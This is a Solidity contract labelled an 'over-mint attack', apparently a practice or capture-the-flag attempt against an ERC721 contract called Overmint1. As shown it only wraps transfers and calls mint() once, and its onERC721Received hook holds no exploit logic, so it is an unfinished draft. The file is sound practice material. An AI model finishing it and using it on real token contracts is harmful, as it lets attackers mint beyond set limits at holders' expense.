// Import necessary contracts/interfaces
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./overmint1.sol";


// Contract for over-mint attack
contract AttackOverMint1 is IERC721Receiver {

    // // Declare variables
    // using SafeMath for uint256;
    // IERC721 omint1;

    // // Constructor function
    // constructor(IERC721 _omint1) {
    //     omint1 = _omint1;
    // }

    Overmint1 public omint1;
    constructor(address _omint1) {
            omint1 = Overmint1(_omint1);
           // omint2 = Overmint2(_omint2);
            // ERC721 erc721;
           
        }

    // Function to trigger over-mint attack
    function transferToContract(uint tokenId) external {
        omint1.safeTransferFrom(msg.sender, address(this), tokenId);
        
    }


    function transferToAddr(uint tokenId) external {
        omint1.safeTransferFrom(address(this), msg.sender, tokenId);
    }

    // Function to receive ERC721 tokens
    function onERC721Received(address, address, uint256, bytes calldata) external override returns (bytes4) {
        // can add extra logic here
        return IERC721Receiver.onERC721Received.selector;
    }

function attack2() external {
    omint1.mint();
    //omint1.safeTransferFrom(address(this), msg.sender, 0);
}

}
